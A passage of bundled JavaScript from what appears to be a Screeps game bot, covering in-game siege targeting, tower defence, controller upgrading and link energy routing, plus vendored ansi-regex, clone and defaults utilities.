        const maxWallHits = _.max(_.map(room.barriers, b => b.hits)) || 0;
        // Compute path with wall position costs weighted by fraction of highest wall
        const ret = PathFinder.search(pos, approach, {
            maxRooms: 1,
            plainCost: 1,
            swampCost: 2,
            roomCallback: roomName => {
                if (roomName != pos.roomName)
                    return false;
                const matrix = new PathFinder.CostMatrix();
                for (const barrier of room.barriers) {
                    const cost = 100 + Math.round((barrier.hits / maxWallHits) * 100);
                    matrix.set(barrier.pos.x, barrier.pos.y, cost);
                }
                return matrix;
            },
        });
        // Target the first non-road, non-container structure you find along the path
        for (const pos of ret.path) {
            const targetStructure = _.first(_.filter(pos.lookFor(LOOK_STRUCTURES), s => {
                return s.structureType != STRUCTURE_ROAD && s.structureType != STRUCTURE_CONTAINER;
            }));
            if (targetStructure) {
                log.debug(`Targeting structure @ ${targetStructure.pos.print}`);
                return targetStructure;
            }
        }
    }
    static findBestSwarmStructureTarget(swarm, roomName, randomness = 0, displayCostMatrix = false) {
        const room = Game.rooms[roomName];
        // Don't accidentally destroy your own shit
        if (!room || room.my || room.reservedByMe) {
            return;
        }
        if (swarm.anchor.roomName != roomName) {
            log.warning(`Swarm is not in target room!`);
            return;
        }
        // // Look for any unprotected structures
        // let unprotectedRepairables = _.filter(room.repairables, s => {
        //  let rampart = s.pos.lookForStructure(STRUCTURE_RAMPART);
        //  return !rampart || rampart.hits < 10000;
        // });
        // let approach = _.map(unprotectedRepairables, structure => {
        //  return {pos: structure.pos, range: 0};
        // }) as PathFinderGoal[];
        // if (room.barriers.length == 0 && unprotectedRepairables.length == 0) return; // if there's nothing in the room
        //
        // // Try to find a reachable unprotected structure
        // if (approach.length > 0) {
        //  let ret = PathFinder.search(swarm.anchor, approach, {
        //      maxRooms    : 1,
        //      maxOps      : 2000,
        //      roomCallback: roomName => {
        //          if (roomName != room.name) return false;
        //          let matrix = Pathing.getSwarmTerrainMatrix(roomName, swarm.width, swarm.height).clone();
        //          for (let barrier of room.barriers) {
        //              let setPositions = Pathing.getPosWindow(barrier.pos, -swarm.width, -swarm.height);
        //              for (let pos of setPositions) {
        //                  matrix.set(pos.x, pos.y, 0xff);
        //              }
        //          }
        //          return matrix;
        //      },
        //  });
        //  let targetPos = _.last(ret.path);
        //  if (!ret.incomplete && targetPos) {
        //      let targetStructure = _.first(_.filter(targetPos.lookFor(LOOK_STRUCTURES), s => {
        //          return s.structureType != STRUCTURE_ROAD && s.structureType != STRUCTURE_CONTAINER;
        //      }));
        //      if (targetStructure) {
        //          log.debug(`Found unprotected structure target @ ${targetPos.print}`);
        //          return targetStructure;
        //      }
        //  }
        // }
        // Determine a "siege anchor" for what you eventually want to destroy
        let targets = room.spawns;
        if (targets.length == 0)
            targets = room.towers;
        if (targets.length == 0)
            targets = room.repairables;
        if (targets.length == 0)
            targets = room.barriers;
        if (targets.length == 0)
            targets = room.structures;
        if (targets.length == 0)
            return;
        // Recalculate approach targets
        const approach = _.map(targets, s => {
            return { pos: s.pos, range: 0 };
        });
        const maxWallHits = _.max(_.map(room.barriers, b => b.hits)) || 0;
        // Compute path with wall position costs weighted by fraction of highest wall
        const ret = PathFinder.search(swarm.anchor, approach, {
            maxRooms: 1,
            plainCost: 1,
            swampCost: 2,
            roomCallback: rn => {
                if (rn != roomName)
                    return false;
                const matrix = Pathing.getSwarmTerrainMatrix(roomName, swarm.width, swarm.height).clone();
                for (const barrier of room.barriers) {
                    const randomFactor = Math.min(Math.round(randomness * Math.random()), 100);
                    const cost = 100 + Math.round((barrier.hits / maxWallHits) * 100) + randomFactor;
                    const setPositions = Pathing.getPosWindow(barrier.pos, -swarm.width, -swarm.height);
                    for (const pos of setPositions) {
                        matrix.set(pos.x, pos.y, Math.max(cost, matrix.get(pos.x, pos.y)));
                    }
                }
                if (displayCostMatrix) {
                    Visualizer.displayCostMatrix(matrix, roomName);
                }
                return matrix;
            },
        });
        // Target the first non-road, non-container structure you find along the path or neighboring positions
        for (const pos of ret.path) {
            log.debug(`Searching path ${pos.print}...`);
            const searchPositions = Pathing.getPosWindow(pos, swarm.width, swarm.height); // not -1*width
            for (const searchPos of searchPositions) {
                const targetStructure = _.first(_.filter(searchPos.lookFor(LOOK_STRUCTURES), s => {
                    return s.structureType != STRUCTURE_ROAD && s.structureType != STRUCTURE_CONTAINER;
                }));
                if (targetStructure) {
                    log.debug(`Targeting structure @ ${targetStructure.pos.print}`);
                    return targetStructure;
                }
            }
        }
    }
};
CombatTargeting = __decorate([
    profile
], CombatTargeting);

var SporeCrawler_1;
/**
 * The spore crawler is the hive cluster for controlling towers within a room
 */
let SporeCrawler = SporeCrawler_1 = class SporeCrawler extends HiveCluster {
    constructor(colony, tower) {
        super(colony, tower, 'sporeCrawler');
        // Register structure components
        this.towers = this.colony.towers;
    }
    refresh() {
        $.refreshRoom(this);
        $.refresh(this, 'towers');
    }
    spawnMoarOverlords() {
    }
    get memory() {
        return undefined;
    }
    registerEnergyRequests() {
        // Request energy from transporters if below request threshold
        for (const tower of this.towers) {
            if (tower.energy < SporeCrawler_1.settings.requestThreshold) {
                const multiplier = tower.energy < SporeCrawler_1.settings.criticalEnergyThreshold ? 2 : 1;
                const dAmountdt = this.room.hostiles.length > 0 ? 10 : 0;
                this.colony.logisticsNetwork.requestInput(tower, { multiplier: multiplier, dAmountdt: dAmountdt });
            }
        }
    }
    init() {
        this.registerEnergyRequests();
    }
    attack(target) {
        for (const tower of this.towers) {
            const result = tower.attack(target);
            if (result == OK) {
                if (target.hitsPredicted == undefined)
                    target.hitsPredicted = target.hits;
                target.hitsPredicted -= CombatIntel.singleTowerDamage(target.pos.getRangeTo(tower));
            }
        }
    }
    // private attackNearestEnemy(prioritizeHealers = false) {
    //  if (prioritizeHealers) {
    //      let healers = _.filter(this.room.hostiles, creep => creep.getActiveBodyparts(HEAL) > 0);
    //      if (healers.length > 0) {
    //          let healer = this.pos.findClosestByRange(healers);
    //          if (healer) {
    //              return this.tower.attack(healer);
    //          }
    //      }
    //  }
    //  let closestHostile = this.pos.findClosestByRange(FIND_HOSTILE_CREEPS);
    //  if (closestHostile) {
    //      return this.tower.attack(closestHostile);
    //  }
    // }
    // private healNearestAlly() {
    //  var closestDamagedAlly = this.pos.findClosestByRange(FIND_MY_CREEPS, {
    //      filter: (c: Creep) => c.hits < c.hitsMax,
    //  });
    //  if (closestDamagedAlly) {
    //      return this.tower.heal(closestDamagedAlly);
    //  }
    // }
    preventRampartDecay() {
        if (this.colony.level < 7 && this.towers.length > 0) {
            // expensive to check all rampart hits; only run in intermediate RCL
            const dyingRamparts = _.filter(this.room.ramparts, rampart => rampart.hits < WorkerOverlord.settings.barrierHits.critical
                && this.colony.roomPlanner.barrierPlanner.barrierShouldBeHere(rampart.pos));
            if (dyingRamparts.length > 0) {
                for (const tower of this.towers) {
                    tower.repair(tower.pos.findClosestByRange(dyingRamparts));
                }
            }
        }
    }
    // private repairNearestStructure() {
    //  var closestDamagedStructure = this.pos.findClosestByRange(FIND_STRUCTURES, {
    //      filter: (s: Structure) => s.hits < s.hitsMax &&
    //                                s.structureType != STRUCTURE_WALL &&
    //                                s.structureType != STRUCTURE_RAMPART,
    //  });
    //  if (closestDamagedStructure) {
    //      return this.tower.repair(closestDamagedStructure);
    //  }
    // }
    run() {
        if (this.room.hostiles.length > 0) {
            const myDefenders = _.filter(this.room.creeps, creep => creep.getActiveBodyparts(ATTACK) > 1);
            const myRangedDefenders = _.filter(this.room.creeps, creep => creep.getActiveBodyparts(RANGED_ATTACK) > 1);
            const myCreepDamage = ATTACK_POWER * _.sum(myDefenders, creep => CombatIntel.getAttackPotential(creep)) +
                RANGED_ATTACK_POWER * _.sum(myRangedDefenders, creep => CombatIntel.getRangedAttackPotential(creep));
            const HEAL_FUDGE_FACTOR = 1.0;
            const avgHealing = HEAL_FUDGE_FACTOR * CombatIntel.avgHostileHealingTo(this.room.hostiles);
            let possibleTargets = _.filter(this.room.hostiles, hostile => {
                // let healing = HEAL_FUDGE_FACTOR * CombatIntel.maxHostileHealingTo(hostile);
                const damageTaken = CombatIntel.towerDamageAtPos(hostile.pos) + myCreepDamage;
                const damageMultiplier = CombatIntel.minimumDamageTakenMultiplier(hostile);
                return damageTaken * damageMultiplier > avgHealing;
            });
            // Only attack dancing targets (drain attack) which are far enough in rooms to be killed off by towers
            possibleTargets = _.filter(possibleTargets, hostile => {
                if (CombatIntel.isEdgeDancing(hostile)) {
                    const netDPS = CombatIntel.towerDamageAtPos(hostile.pos) + myCreepDamage
                        - (HEAL_FUDGE_FACTOR * CombatIntel.maxHostileHealingTo(hostile));
                    const isKillable = netDPS * hostile.pos.rangeToEdge > hostile.hits;
                    if (isKillable) {
                        return true;
                    }
                    else {
                        // Shoot if they get close enough
                        if (this.colony.bunker && this.colony.bunker.anchor &&
                            hostile.pos.getRangeTo(this.colony.bunker.anchor) <= 6 + 2) {
                            return true;
                        }
                    }
                }
                else {
                    return true;
                }
            });
            const target = CombatTargeting.findBestCreepTargetForTowers(this.room, possibleTargets);
            if (target) {
                return this.attack(target);
            }
        }
        const closestDamagedAlly = this.pos.findClosestByRange(_.filter(this.room.creeps, creep => creep.hits < creep.hitsMax));
        if (closestDamagedAlly) {
            for (const tower of this.towers) {
                tower.heal(closestDamagedAlly);
            }
            return;
        }
        // Towers build nuke response ramparts
        const nearbyNukeRamparts = _.filter(this.colony.overlords.work.nukeDefenseRamparts, rampart => this.pos.getRangeTo(rampart) <= TOWER_OPTIMAL_RANGE);
        if (nearbyNukeRamparts.length > 0 && this.colony.terminal
            && this.colony.terminalState != TERMINAL_STATE_REBUILD) {
            const nukes = this.colony.room.find(FIND_NUKES);
            const timeToImpact = _.min(_.map(nukes, nuke => nuke.timeToLand));
            if (timeToImpact) {
                const repairHitsRemaining = _.sum(_.values(this.colony.overlords.work.nukeDefenseHitsRemaining));
                const hitsRepairedPerTick = this.towers.length * TOWER_POWER_REPAIR;
                // Only repair using towers if it looks like you won't finish repairs in time
                if (repairHitsRemaining > 0.9 * hitsRepairedPerTick * timeToImpact) {
                    for (const tower of this.towers) {
                        tower.repair(nearbyNukeRamparts[0]);
                    }
                    return;
                }
            }
            else {
                // Shouldn't get here
                log.warning(`No time to impact! (Why?)`);
            }
        }
        // Prevent rampart decay at early RCL
        this.preventRampartDecay();
    }
    visuals() {
    }
};
SporeCrawler.settings = {
    requestThreshold: 500,
    criticalEnergyThreshold: 250,
};
SporeCrawler = SporeCrawler_1 = __decorate([
    profile
], SporeCrawler);

/**
 * Spawns an upgrader to upgrade the room controller
 */
let UpgradingOverlord = class UpgradingOverlord extends Overlord {
    constructor(upgradeSite, priority = OverlordPriority.upgrading.upgrade) {
        super(upgradeSite, 'upgrade', priority);
        this.upgradeSite = upgradeSite;
        this.upgraders = this.zerg(Roles.upgrader, {
            boostWishlist: [boostResources.upgrade[3]]
        });
    }
    init() {
        if (this.colony.level < 3) { // can't spawn upgraders at early levels
            return;
        }
        if (this.colony.assets[RESOURCE_ENERGY] > UpgradeSite.settings.energyBuffer
            || this.upgradeSite.controller.ticksToDowngrade < 500) {
            const setup = this.colony.level == 8 ? Setups.upgraders.rcl8 : Setups.upgraders.default;
            if (this.colony.level == 8) {
                this.wishlist(1, setup);
            }
            else {
                const upgradePowerEach = setup.getBodyPotential(WORK, this.colony);
                const upgradersNeeded = Math.ceil(this.upgradeSite.upgradePowerNeeded / upgradePowerEach);
                this.wishlist(upgradersNeeded, setup);
            }
        }
    }
    handleUpgrader(upgrader) {
        if (upgrader.carry.energy > 0) {
            // Repair link
            if (this.upgradeSite.link && this.upgradeSite.link.hits < this.upgradeSite.link.hitsMax) {
                upgrader.task = Tasks.repair(this.upgradeSite.link);
                return;
            }
            // Repair container
            if (this.upgradeSite.battery && this.upgradeSite.battery.hits < this.upgradeSite.battery.hitsMax) {
                upgrader.task = Tasks.repair(this.upgradeSite.battery);
                return;
            }
            // Build construction site
            const inputSite = this.upgradeSite.findInputConstructionSite();
            if (inputSite) {
                upgrader.task = Tasks.build(inputSite);
                return;
            }
            // Sign controller if needed
            if (!this.upgradeSite.controller.signedByMe &&
                !this.upgradeSite.controller.signedByScreeps) {
                upgrader.task = Tasks.signController(this.upgradeSite.controller);
                return;
            }
            upgrader.task = Tasks.upgrade(this.upgradeSite.controller);
        }
        else {
            // Recharge from link or battery
            if (this.upgradeSite.link && this.upgradeSite.link.energy > 0) {
                upgrader.task = Tasks.withdraw(this.upgradeSite.link);
            }
            else if (this.upgradeSite.battery && this.upgradeSite.battery.energy > 0) {
                upgrader.task = Tasks.withdraw(this.upgradeSite.battery);
            }
            // Find somewhere else to recharge from
            else { // TODO: BUG HERE IF NO UPGRADE CONTAINER
                if (this.upgradeSite.battery && this.upgradeSite.battery.targetedBy.length == 0) {
                    upgrader.task = Tasks.recharge();
                }
            }
        }
    }
    run() {
        this.autoRun(this.upgraders, upgrader => this.handleUpgrader(upgrader));
    }
};
UpgradingOverlord = __decorate([
    profile
], UpgradingOverlord);

var UpgradeSite_1;
/**
 * Upgrade sites group upgrade-related structures around a controller, such as an input link and energy container
 */
let UpgradeSite = UpgradeSite_1 = class UpgradeSite extends HiveCluster {
    constructor(colony, controller) {
        super(colony, controller, 'upgradeSite');
        this.controller = controller;
        this.memory = Mem.wrap(this.colony.memory, 'upgradeSite');
        this.upgradePowerNeeded = this.getUpgradePowerNeeded();
        // Register bettery
        $.set(this, 'battery', () => {
            const allowableContainers = _.filter(this.room.containers, container => container.pos.findInRange(FIND_SOURCES, 1).length == 0); // only count containers that aren't near sources
            return this.pos.findClosestByLimitedRange(allowableContainers, 3);
        });
        this.batteryPos = $.pos(this, 'batteryPos', () => {
            if (this.battery) {
                return this.battery.pos;
            }
            const inputSite = this.findInputConstructionSite();
            if (inputSite) {
                return inputSite.pos;
            }
            return this.calculateBatteryPos() || log.alert(`Upgrade site at ${this.pos.print}: no batteryPos!`);
        });
        if (this.batteryPos)
            this.colony.destinations.push({ pos: this.batteryPos, order: 0 });
        // Register link
        $.set(this, 'link', () => this.pos.findClosestByLimitedRange(colony.availableLinks, 3));
        this.colony.linkNetwork.claimLink(this.link);
        // // Energy per tick is sum of upgrader body parts and nearby worker body parts
        // this.energyPerTick = $.number(this, 'energyPerTick', () =>
        //  _.sum(this.overlord.upgraders, upgrader => upgrader.getActiveBodyparts(WORK)) +
        //  _.sum(_.filter(this.colony.getCreepsByRole(WorkerSetup.role), worker =>
        //            worker.pos.inRangeTo((this.link || this.battery || this).pos, 2)),
        //        worker => worker.getActiveBodyparts(WORK)));
        // Compute stats
        this.stats();
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'upgradeSite');
        $.refreshRoom(this);
        $.refresh(this, 'controller', 'battery', 'link');
    }
    spawnMoarOverlords() {
        // Register overlord
        this.overlord = new UpgradingOverlord(this);
    }
    findInputConstructionSite() {
        const nearbyInputSites = this.pos.findInRange(this.room.constructionSites, 4, {
            filter: (s) => s.structureType == STRUCTURE_CONTAINER ||
                s.structureType == STRUCTURE_LINK,
        });
        return _.first(nearbyInputSites);
    }
    getUpgradePowerNeeded() {
        return $.number(this, 'upgradePowerNeeded', () => {
            if (this.room.storage) { // Workers perform upgrading until storage is set up
                const amountOver = Math.max(this.colony.assets.energy - UpgradeSite_1.settings.energyBuffer, 0);
                let upgradePower = 1 + Math.floor(amountOver / UpgradeSite_1.settings.energyPerBodyUnit);
                if (amountOver > 800000) {
                    upgradePower *= 4; // double upgrade power if we have lots of surplus energy
                }
                else if (amountOver > 500000) {
                    upgradePower *= 2;
                }
                if (this.controller.level == 8) {
                    upgradePower = Math.min(upgradePower, 15); // don't go above 15 work parts at RCL 8
                }
                return upgradePower;
            }
            else {
                return 0;
            }
        });
    }
    init() {
        // Register energy requests
        if (this.link && this.link.energy < UpgradeSite_1.settings.linksRequestBelow) {
            this.colony.linkNetwork.requestReceive(this.link);
        }
        const inThreshold = this.colony.stage > ColonyStage.Larva ? 0.5 : 0.75;
        if (this.battery) {
            if (this.battery.energy < inThreshold * this.battery.storeCapacity) {
                const energyPerTick = UPGRADE_CONTROLLER_POWER * this.upgradePowerNeeded;
                this.colony.logisticsNetwork.requestInput(this.battery, { dAmountdt: energyPerTick });
            }
            if (hasMinerals(this.battery.store)) { // get rid of any minerals in the container if present
                this.colony.logisticsNetwork.requestOutputMinerals(this.battery);
            }
        }
    }
    /* Calculate where the input will be built for this site */
    calculateBatteryPos() {
        let originPos;
        if (this.colony.storage) {
            originPos = this.colony.storage.pos;
        }
        else if (this.colony.roomPlanner.storagePos) {
            originPos = this.colony.roomPlanner.storagePos;
        }
        else {
            return;
        }
        // Find all positions at range 2 from controller
        let inputLocations = [];
        for (const pos of this.pos.getPositionsAtRange(2)) {
            if (pos.isWalkable(true)) {
                inputLocations.push(pos);
            }
        }
        // Try to find locations where there is maximal standing room
        const maxNeighbors = _.max(_.map(inputLocations, pos => pos.availableNeighbors(true).length));
        inputLocations = _.filter(inputLocations, pos => pos.availableNeighbors(true).length >= maxNeighbors);
        // Return location closest to storage by path
        const inputPos = originPos.findClosestByPath(inputLocations);
        if (inputPos) {
            return inputPos;
        }
    }
    /* Build a container output at the optimal location */
    buildBatteryIfMissing() {
        if (!this.battery && !this.findInputConstructionSite()) {
            const buildHere = this.batteryPos;
            if (buildHere) {
                const result = buildHere.createConstructionSite(STRUCTURE_CONTAINER);
                if (result == OK) {
                    return;
                }
                else {
                    log.warning(`Upgrade site at ${this.pos.print}: cannot build battery! Result: ${result}`);
                }
            }
        }
    }
    stats() {
        const defaults = {
            downtime: 0,
        };
        if (!this.memory.stats)
            this.memory.stats = defaults;
        _.defaults(this.memory.stats, defaults);
        // Compute downtime
        this.memory.stats.downtime = (this.memory.stats.downtime * (CREEP_LIFE_TIME - 1) +
            (this.battery ? +this.battery.isEmpty : 0)) / CREEP_LIFE_TIME;
        Stats.log(`colonies.${this.colony.name}.upgradeSite.downtime`, this.memory.stats.downtime);
    }
    run() {
        if (Game.time % 25 == 7 && this.colony.level >= 2) {
            this.buildBatteryIfMissing();
        }
    }
    visuals() {
        // let info = [];
        // if (this.controller.level != 8) {
        //  let progress = `${Math.floor(this.controller.progress / 1000)}K`;
        //  let progressTotal = `${Math.floor(this.controller.progressTotal / 1000)}K`;
        //  let percent = `${Math.floor(100 * this.controller.progress / this.controller.progressTotal)}`;
        //  info.push(`Progress: ${progress}/${progressTotal} (${percent}%)`);
        //
        // }
        // info.push(`Downtime: ${this.memory.stats.downtime.toPercent()}`);
        // Visualizer.showInfo(info, this);
    }
};
// energyPerTick: number;
UpgradeSite.settings = {
    energyBuffer: 100000,
    energyPerBodyUnit: 10000,
    minLinkDistance: 10,
    linksRequestBelow: 200,
};
UpgradeSite = UpgradeSite_1 = __decorate([
    profile
], UpgradeSite);

/**
 * The link network controls the flow of energy through various links in a room and uses a greedy matching algorithm
 * to determine where to send energy to
 */
let LinkNetwork = class LinkNetwork {
    constructor(colony) {
        this.colony = colony;
        this.receive = [];
        this.transmit = [];
        this.settings = {
            linksTrasmitAt: LINK_CAPACITY - 100,
        };
    }
    refresh() {
        this.receive = [];
        this.transmit = [];
    }
    claimLink(link) {
        if (link) {
            _.remove(this.colony.availableLinks, l => l.id == link.id);
        }
    }
    requestReceive(link) {
        this.receive.push(link);
    }
    requestTransmit(link) {
        this.transmit.push(link);
    }
    /**
     * Number of ticks until a dropoff link is available again to deposit energy to
     */
    getDropoffAvailability(link) {
        const dest = this.colony.commandCenter ? this.colony.commandCenter.pos : this.colony.pos;
        const usualCooldown = link.pos.getRangeTo(dest);
        if (link.energy > this.settings.linksTrasmitAt) { // Energy will be sent next time cooldown == 0
            return link.cooldown + usualCooldown;
        }
        else {
            return link.cooldown;
        }
    }
    init() {
        // for (let link of this.colony.dropoffLinks) {
        //  if (link.energy > this.settings.linksTrasmitAt) {
        //      this.requestTransmit(link);
        //  }
        // }
    }
    /**
     * Examine the link resource requests and try to efficiently (but greedily) match links that need energy in and
     * out, then send the remaining resourceOut link requests to the command center link
     */
    run() {
        // For each receiving link, greedily get energy from the closest transmitting link - at most 9 operations
        for (const receiveLink of this.receive) {
            const closestTransmitLink = receiveLink.pos.findClosestByRange(this.transmit);
            // If a send-receive match is found, transfer that first, then remove the pair from the link lists
            if (closestTransmitLink) {
                // Send min of (all the energy in sender link, amount of available space in receiver link)
                const amountToSend = _.min([closestTransmitLink.energy, receiveLink.energyCapacity - receiveLink.energy]);
                closestTransmitLink.transferEnergy(receiveLink, amountToSend);
                _.remove(this.transmit, link => link == closestTransmitLink);
                // _.remove(this.receive, link => link == receiveLink);
            }
        }
        // Now send all remaining transmit link requests to the command center
        if (this.colony.commandCenter && this.colony.commandCenter.link) {
            for (const transmitLink of this.transmit) {
                transmitLink.transferEnergy(this.colony.commandCenter.link);
            }
        }
    }
};
LinkNetwork = __decorate([
    profile
], LinkNetwork);

'use strict';
var ansiRegex = function () {
    return /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-PRZcf-nqry=><]/g;
};

var ansiRegex$1 = /*#__PURE__*/Object.freeze({
    default: ansiRegex,
    __moduleExports: ansiRegex
});

var require$$0 = ( ansiRegex$1 && ansiRegex ) || ansiRegex$1;

'use strict';
var ansiRegex$2 = require$$0();

var stripAnsi = function (str) {
    return typeof str === 'string' ? str.replace(ansiRegex$2, '') : str;
};

var stripAnsi$1 = /*#__PURE__*/Object.freeze({
    default: stripAnsi,
    __moduleExports: stripAnsi
});

var clone_1 = createCommonjsModule(function (module) {
var clone = (function() {
'use strict';

/**
 * Clones (copies) an Object using deep copying.
 *
 * This function supports circular references by default, but if you are certain
 * there are no circular references in your object, you can save some CPU time
 * by calling clone(obj, false).
 *
 * Caution: if `circular` is false and `parent` contains circular references,
 * your program may enter an infinite loop and crash.
 *
 * @param `parent` - the object to be cloned
 * @param `circular` - set to true if the object to be cloned may contain
 *    circular references. (optional - true by default)
 * @param `depth` - set to a number if the object is only to be cloned to
 *    a particular depth. (optional - defaults to Infinity)
 * @param `prototype` - sets the prototype to be used when cloning an object.
 *    (optional - defaults to parent prototype).
*/
function clone(parent, circular, depth, prototype) {
  var filter;
  if (typeof circular === 'object') {
    depth = circular.depth;
    prototype = circular.prototype;
    filter = circular.filter;
    circular = circular.circular;
  }
  // maintain two arrays for circular references, where corresponding parents
  // and children have the same index
  var allParents = [];
  var allChildren = [];

  var useBuffer = typeof Buffer != 'undefined';

  if (typeof circular == 'undefined')
    circular = true;

  if (typeof depth == 'undefined')
    depth = Infinity;

  // recurse this function so we don't reset allParents and allChildren
  function _clone(parent, depth) {
    // cloning null always returns null
    if (parent === null)
      return null;

    if (depth == 0)
      return parent;

    var child;
    var proto;
    if (typeof parent != 'object') {
      return parent;
    }

    if (clone.__isArray(parent)) {
      child = [];
    } else if (clone.__isRegExp(parent)) {
      child = new RegExp(parent.source, __getRegExpFlags(parent));
      if (parent.lastIndex) child.lastIndex = parent.lastIndex;
    } else if (clone.__isDate(parent)) {
      child = new Date(parent.getTime());
    } else if (useBuffer && Buffer.isBuffer(parent)) {
      if (Buffer.allocUnsafe) {
        // Node.js >= 4.5.0
        child = Buffer.allocUnsafe(parent.length);
      } else {
        // Older Node.js versions
        child = new Buffer(parent.length);
      }
      parent.copy(child);
      return child;
    } else {
      if (typeof prototype == 'undefined') {
        proto = Object.getPrototypeOf(parent);
        child = Object.create(proto);
      }
      else {
        child = Object.create(prototype);
        proto = prototype;
      }
    }

    if (circular) {
      var index = allParents.indexOf(parent);

      if (index != -1) {
        return allChildren[index];
      }
      allParents.push(parent);
      allChildren.push(child);
    }

    for (var i in parent) {
      var attrs;
      if (proto) {
        attrs = Object.getOwnPropertyDescriptor(proto, i);
      }

      if (attrs && attrs.set == null) {
        continue;
      }
      child[i] = _clone(parent[i], depth - 1);
    }

    return child;
  }

  return _clone(parent, depth);
}

/**
 * Simple flat clone using prototype, accepts only objects, usefull for property
 * override on FLAT configuration object (no nested props).
 *
 * USE WITH CAUTION! This may not behave as you wish if you do not know how this
 * works.
 */
clone.clonePrototype = function clonePrototype(parent) {
  if (parent === null)
    return null;

  var c = function () {};
  c.prototype = parent;
  return new c();
};

// private utility functions

function __objToStr(o) {
  return Object.prototype.toString.call(o);
}
clone.__objToStr = __objToStr;

function __isDate(o) {
  return typeof o === 'object' && __objToStr(o) === '[object Date]';
}
clone.__isDate = __isDate;

function __isArray(o) {
  return typeof o === 'object' && __objToStr(o) === '[object Array]';
}
clone.__isArray = __isArray;

function __isRegExp(o) {
  return typeof o === 'object' && __objToStr(o) === '[object RegExp]';
}
clone.__isRegExp = __isRegExp;

function __getRegExpFlags(re) {
  var flags = '';
  if (re.global) flags += 'g';
  if (re.ignoreCase) flags += 'i';
  if (re.multiline) flags += 'm';
  return flags;
}
clone.__getRegExpFlags = __getRegExpFlags;

return clone;
})();

if ('object' === 'object' && module.exports) {
  module.exports = clone;
}
});

var clone = /*#__PURE__*/Object.freeze({
    default: clone_1,
    __moduleExports: clone_1
});

var clone$1 = ( clone && clone_1 ) || clone;

var defaults = function(options, defaults) {
  options = options || {};

  Object.keys(defaults).forEach(function(key) {
    if (typeof options[key] === 'undefined') {
      options[key] = clone$1(defaults[key]);
    }
  });

  return options;
};

var defaults$1 = /*#__PURE__*/Object.freeze({
    default: defaults,
    __moduleExports: defaults
});

var combining = [
    [ 0x0300, 0x036F ], [ 0x0483, 0x0486 ], [ 0x0488, 0x0489 ],
    [ 0x0591, 0x05BD ], [ 0x05BF, 0x05BF ], [ 0x05C1, 0x05C2 ],
    [ 0x05C4, 0x05C5 ], [ 0x05C7, 0x05C7 ], [ 0x0600, 0x0603 ],
    [ 0x0610, 0x0615 ], [ 0x064B, 0x065E ], [ 0x0670, 0x0670 ],
    [ 0x06D6, 0x06E4 ], [ 0x06E7, 0x06E8 ], [ 0x06EA, 0x06ED ],
    [ 0x070F, 0x070F ], [ 0x0711, 0x0711 ], [ 0x0730, 0x074A ],
    [ 0x07A6, 0x07B0 ], [ 0x07EB, 0x07F3 ], [ 0x0901, 0x0902 ],
    [ 0x093C, 0x093C ], [ 0x0941, 0x0948 ], [ 0x094D, 0x094D ],
    [ 0x0951, 0x0954 ], [ 0x0962, 0x0963 ], [ 0x0981, 0x0981 ],
    [ 0x09BC, 0x09BC ], [ 0x09C1, 0x09C4 ], [ 0x09CD, 0x09CD ],
    [ 0x09E2, 0x09E3 ], [ 0x0A01, 0x0A02 ], [ 0x0A3C, 0x0A3C ],
    [ 0x0A41, 0x0A42 ], [ 0x0A47, 0x0A48 ], [ 0x0A4B, 0x0A4D ],
    [ 0x0A70, 0x0A71 ], [ 0x0A81, 0x0A82 ], [ 0x0ABC, 0x0ABC ],
    [ 0x0AC1, 0x0AC5 ], [ 0x0AC7, 0x0AC8 ], [ 0x0ACD, 0x0ACD ],
    [ 0x0AE2, 0x0AE3 ], [ 0x0B01, 0x0B01 ], [ 0x0B3C, 0x0B3C ],
    [ 0x0B3F, 0x0B3F ], [ 0x0B41, 0x0B43 ], [ 0x0B4D, 0x0B4D ],
    [ 0x0B56, 0x0B56 ], [ 0x0B82, 0x0B82 ], [ 0x0BC0, 0x0BC0 ],
    [ 0x0BCD, 0x0BCD ], [ 0x0C3E, 0x0C40 ], [ 0x0C46, 0x0C48 ],
    [ 0x0C4A, 0x0C4D ], [ 0x0C55, 0x0C56 ], [ 0x0CBC, 0x0CBC ],
    [ 0x0CBF, 0x0CBF ], [ 0x0CC6, 0x0CC6 ], [ 0x0CCC, 0x0CCD ],
    [ 0x0CE2, 0x0CE3 ], [ 0x0D41, 0x0D43 ], [ 0x0D4D, 0x0D4D ],
    [ 0x0DCA, 0x0DCA ], [ 0x0DD2, 0x0DD4 ], [ 0x0DD6, 0x0DD6 ],
    [ 0x0E31, 0x0E31 ], [ 0x0E34, 0x0E3A ], [ 0x0E47, 0x0E4E ],
    [ 0x0EB1, 0x0EB1 ], [ 0x0EB4, 0x0EB9 ], [ 0x0EBB, 0x0EBC ],
    [ 0x0EC8, 0x0ECD ], [ 0x0F18, 0x0F19 ], [ 0x0F35, 0x0F35 ],
    [ 0x0F37, 0x0F37 ], [ 0x0F39, 0x0F39 ], [ 0x0F71, 0x0F7E ],
    [ 0x0F80, 0x0F84 ], [ 0x0F86, 0x0F87 ], [ 0x0F90, 0x0F97 ],
    [ 0x0F99, 0x0FBC ], [ 0x0FC6, 0x0FC6 ], [ 0x102D, 0x1030 ],
    [ 0x1032, 0x1032 ], [ 0x1036, 0x1037 ], [ 0x1039, 0x1039 ],
    [ 0x1058, 0x1059 ], [ 0x1160, 0x11FF ], [ 0x135F, 0x135F ],
    [ 0x1712, 0x1714 ], [ 0x1732, 0x1734 ], [ 0x1752, 0x1753 ],
    [ 0x1772, 0x1773 ], [ 0x17B4, 0x17B5 ], [ 0x17B7, 0x17BD ],
    [ 0x17C6, 0x17C6 ], [ 0x17C9, 0x17D3 ], [ 0x17DD, 0x17DD ],
    [ 0x180B, 0x180D ], [ 0x18A9, 0x18A9 ], [ 0x1920, 0x1922 ],
    [ 0x1927, 0x1928 ], [ 0x1932, 0x1932 ], [ 0x1939, 0x193B ],
    [ 0x1A17, 0x1A18 ], [ 0x1B00, 0x1B03 ], [ 0x1B34, 0x1B34 ],
    [ 0x1B36, 0x1B3A ], [ 0x1B3C, 0x1B3C ], [ 0x1B42, 0x1B42 ],
    [ 0x1B6B, 0x1B73 ], [ 0x1DC0, 0x1DCA ], [ 0x1DFE, 0x1DFF ],
    [ 0x200B, 0x200F ], [ 0x202A, 0x202E ], [ 0x2060, 0x2063 ],
    [ 0x206A, 0x206F ], [ 0x20D0, 0x20EF ], [ 0x302A, 0x302F ],
